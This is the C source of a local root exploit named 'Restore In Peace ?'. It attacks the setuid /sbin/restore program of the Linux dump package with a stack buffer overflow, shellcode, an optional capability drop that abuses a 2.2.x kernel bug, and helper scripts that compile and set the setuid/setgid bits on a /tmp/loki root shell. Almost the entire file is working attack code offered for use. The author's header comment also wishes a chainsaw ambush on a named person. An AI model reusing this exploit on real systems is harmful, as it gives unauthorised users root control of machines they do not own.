/*
   Restore In Peace ?
 
   Guess not, silly mistakes keep being made in the dump package time
   and time again... Someone should give it an audit once
 
    For once, NOT a L4m3rz stylish shellscript, but a pure C program that
    does the same trick.
    It's so messy that I have changed my mind about not writing shellscript
    exploits and will go and write a L4m3rz stylish script next time :)
 
    Use as: rip <type> [offset]
    Where type is: 1) Regular Linux box
                   2) Linux box with 2.2.X && X<16 kernel
 
    A Linux box with a buggy kernel will yield root. In other cases we get
    a setgid root.
 
    Type (1) might function a bit buggy with bash 2 since we cannot setgid
    to 0 when we're egid 0 - set SHAT to ash or zsh instead :(
 
    Good Riddance!
       -- Scrippie
       -- ronald@grafix.nl - #phreak.nl - buffer0verfl0w security
 
    Love goes out to: Hester, Maja, Renata
 
    I hope the following person will ambushed by villains with chainsaws:
       Gerrie Mansur
 
    Shouts to: all my friends @ircnet and @IRL
*/

#include <stdio.h>
#include <linux/capability.h>
#include <sys/types.h>

#define NOP	0x90		/* Here I am again, I'm coming back for more */
#define RETA	2068		/* Index number of the return address */
#define NUMNOPS	700		/* 700 usefull nops on the stack */
#define SHELLAT	"/tmp/loki"	/* Hail to thee, god of evil! */

#define SHAT	"/bin/sh"	/* And to thee, *nix utilities! */
#define CHOWNAT	"/bin/chown"
#define CHMODAT "/bin/chmod"

#define GCCAT	"/usr/bin/gcc"	/* And to thee, GNU utilities! */

#define RESTAT	"/sbin/restore"	/* And to thee, buggy file! */

char hellcode[] =
  "\x66\x31\xc0\x66\x31\xdb\xb0\x17\xcd\x80" /* Bash 2 evasion */
  "\x66\x31\xc0\x66\x31\xdb\xb0\x2e\xcd\x80" /* Idem for gid */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/tmp/lk";

void banner(void);
void makeLKregular(void);
void makeLKbuggyKernel(void);
void makeCFILE(void);

unsigned long get_sp(void)
{
  __asm__("movl %esp, %eax");
}

main(int argc, char **argv)
{
  FILE *evilRestore, lk;
  char *overflow;
  unsigned long addy;
  int offset=6000;		/* My box */
  pid_t child;
  int type;

  if(argc<2)
    {
      banner();
      exit(-1);
    }

  if(argc == 3) offset = atoi(argv[2]);

  switch(atoi(argv[1]))
    {
    case 1:
      printf("Trying to grab SGID root shell...\n");
      type = 1;
      break;
    case 2:
      printf("Trying to grab SUID root shell...\n");
      type = 2;
      break;
    default:
      printf("Unknown type - exiting\n");
      exit(-1);
    }

  if(type == 2)
    {
      struct __user_cap_header_struct caph=
          {
            _LINUX_CAPABILITY_VERSION, 0
          };
      struct __user_cap_data_struct capd=
          {
            0, 0, 0xfffffe7f
          };
      capset(&caph, &capd);
      printf("Dropped the SETUID_CAP...\n");
    }

  addy = get_sp() - offset;

  overflow = (char *) malloc(RETA+5);

  memset(overflow, 0x90, RETA);

  memcpy((overflow+NUMNOPS), hellcode, strlen(hellcode));

  overflow[RETA] = addy & 0xff;
  overflow[RETA+1] = (addy >> 8 & 0xff);
  overflow[RETA+2] = (addy >> 16 & 0xff);
  overflow[RETA+3] = (addy >> 24 & 0xff);
  overflow[RETA+4] = 0x00;

  evilRestore = fopen("/tmp/t", "w");

  printf("Building C program wrapper...\n");
  makeCFILE();
  printf("Building ShellScript that will be called...\n");

  if(type == 1) makeLKregular();
  if(type == 2) makeLKbuggyKernel();

  printf("Building overflow file...\n");
  printf("Using address: %x\n", addy);

  fprintf(evilRestore, "n\nn\nn\nn\n1\n");
  fprintf(evilRestore, overflow);
  fprintf(evilRestore, "\n1\nnone\n");

  fflush(evilRestore);
  fclose(evilRestore);

  printf("Executing: %s\n", RESTAT);
  sleep(3);

  if((child = fork()) == 0)
    {
      char blaat[200];
      snprintf(blaat, 200, "%s -R < /tmp/t\n", RESTAT);
      system(blaat);
    }

  printf("\nIf everything worked out you can now run: %s\n", SHELLAT);

}

void makeLKregular(void)
{
  FILE *lk;
  char blaat[1000];	/* Phjear the allmighty mem-sucker! */

  lk = fopen("/tmp/lk", "w");

  snprintf(blaat, 1000, "#!%s\n%s .root %s\n%s 6755 %s\n",
           SHAT, CHOWNAT, SHELLAT, CHMODAT, SHELLAT);

  fprintf(lk, blaat);
  fflush(lk);
  fclose(lk);
  umask(0);
  chmod("/tmp/lk", 0755);
}

void makeLKbuggyKernel(void)
{
  FILE *lk;
  char blaat[1000];    /* Phjear the allmighty mem-sucker! */

  lk = fopen("/tmp/lk", "w");

  snprintf(blaat, 1000, "#!%s\n%s root.root %s\n%s 6755 %s\n",
           SHAT, CHOWNAT, SHELLAT, CHMODAT, SHELLAT);

  fprintf(lk, blaat);
  fflush(lk);
  fclose(lk);
  umask(0);
  chmod("/tmp/lk", 0755);
}


void makeCFILE(void)
{
  FILE *loki;
  pid_t child;

  loki = fopen("/tmp/loki.c", "w");
  fprintf(loki, "#include <stdio.h>\n\n");
  fprintf(loki, "main()\n");
  fprintf(loki, "{\n   setuid(0);\n");
  fprintf(loki, "   setgid(0);\n");
  fprintf(loki, "   execl(\"");
  fprintf(loki, SHAT);
  fprintf(loki, "\", \"sh\", NULL);\n");
  fprintf(loki, "}");

  fflush(loki);
  fclose(loki);

  if((child = fork()) == 0)
    {
      execl(GCCAT, "gcc", "/tmp/loki.c", "-o", SHELLAT, NULL);
    }
  wait();
  unlink("/tmp/loki.c");
}

void banner(void)
{
  printf("Restore In Peace ? - Scrippie/#phreak.nl/b0f\n");
  printf("--------------------------------------------\n");
  printf("Use as: rip <type> [offset]\n");
  printf("Types - 1) Regular Linux\n");
  printf("      - 2) Linux with buggy kernel :)\n");
}
